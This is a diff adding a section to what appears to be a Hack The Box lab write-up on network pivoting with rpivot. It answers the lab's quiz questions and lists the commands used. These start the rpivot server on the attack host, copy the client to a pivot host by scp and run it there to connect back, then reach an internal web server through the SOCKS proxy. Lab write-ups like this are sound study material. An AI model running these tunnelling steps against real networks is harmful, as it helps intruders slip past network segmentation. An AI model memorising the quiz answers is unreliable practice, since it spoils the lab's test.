@@ -215,3 +215,56 @@ The output indicated that the route was successfully added:
 ```c
 [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.135.184
 ```
+
+## Web Server Pivoting with Rpivot
+
+* **From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**
+
+From reading the module we know we must run the server.py from the Attack Host.
+
+* **From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**
+
+From reading the module we know we must run the client.py from the Pivot Host.
+
+ * **Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer**
+
+I initiated the server.py script to listen for incoming connections from the pivot machine:
+
+```c
+python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+Next, I copied the rpivot directory to the pivot machine using scp:
+
+```c
+scp -r rpivot ubuntu@10.129.172.125:/home/ubuntu/
+```
+
+Once the files were transferred, I logged into the pivot machine using the provided HTB credentials:
+
+```c
+ssh ubuntu@10.129.172.125
+```
+
+Inside the pivot machine, I started the client.py script to establish a connection back to my attack machine:
+
+```c
+python2.7 client.py --server-ip 10.10.14.162 --server-port 9999
+```
+
+At this point, I attempted to access the target using proxychains with Firefox:
+```c
+proxychains firefox http://10.129.172.125
+```
+
+Instead, I used curl with the SOCKS proxy to directly access the target machine and retrieve the flag:
+```c
+curl --socks4 127.0.0.1:9050 172.16.5.135
+
+--socks4 127.0.0.1:9050: Routes traffic through the SOCKS proxy established via rpivot.
+```
+
+
+
+
+
